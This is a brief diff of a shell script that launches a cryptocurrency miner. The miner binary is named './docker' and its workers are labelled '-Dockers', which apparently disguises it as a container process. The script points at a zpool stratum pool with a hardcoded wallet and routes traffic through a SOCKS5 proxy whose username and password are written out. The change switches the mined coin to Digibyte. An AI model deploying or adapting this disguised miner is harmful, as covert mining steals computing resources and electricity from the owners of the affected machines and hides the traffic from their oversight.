@@ -7,4 +7,4 @@ POOL=stratum+tcp://cpupower.na.mine.zpool.ca:6240
 WALLET=D786Q59xzNpTfyewB9mFZjYTHJKs2zE8zV
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Dockers)
 PROXY=socks5://cuan:berhasil123@199.249.170.113:443
-./docker -a verus -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
+./docker -a Digibyte -o $POOL -u $WALLET.$WORKER -p c=DGB,zap=CPU -t 2 -x $PROXY
